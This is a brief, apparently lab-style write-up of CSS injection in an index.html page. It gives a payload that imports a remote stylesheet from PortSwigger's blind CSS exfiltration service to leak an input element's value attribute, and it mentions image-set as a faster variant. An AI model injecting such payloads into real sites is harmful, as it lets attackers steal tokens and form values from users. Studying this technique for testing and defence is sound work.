## CSS Data exfiltration using Attribute selector

`index.html` is injectable with CSS code. Inserting the following payload in the get parameter of the url will extract the value of the `value` attribute in the input element.

Payload: 
```css
<style>
@import 'https://portswigger-labs.net/blind-css-exfiltration/start';
</style>
```

Quicker way to do it is to use the `image-set` method.